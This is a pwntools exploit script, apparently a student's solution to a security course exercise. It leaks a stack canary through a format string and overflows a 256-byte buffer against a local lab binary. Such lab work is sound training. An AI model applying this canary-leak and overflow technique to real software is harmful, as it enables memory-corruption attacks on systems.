#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = '/home/student/handout/exercise5/exercise5a'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

r = start()

# You can now communicate with the process, e.g.,
# r.sendline("AAAAA")
# r.recvline()
"""
$rbp - 0x4 needs to be big to break out of the loop
$rbp - 0x8 some random value, doesn't matter
$rbp - 0xc return value shouldn't be 0
$rbp - 0x10 canary
$rbp - 0x110 buffer
"""

r.recvline()   ## Enter the secret password for user 2:
r.sendline(b"%7$x") # format string for getting canary value
canary = r.recvline().strip()[: (-1) * len("is not the password")]
print(canary)
canary = bytes.fromhex(canary.decode())[::-1]
print(canary)

r.recvuntil(b"Enter the secret password for user 2:\n")
padding = b"A" * 256
another_padding = b"A" * 12  # return_value, _, loop_control

command = padding + canary + another_padding
r.sendline(command)

print(r.recvall(timeout=3))

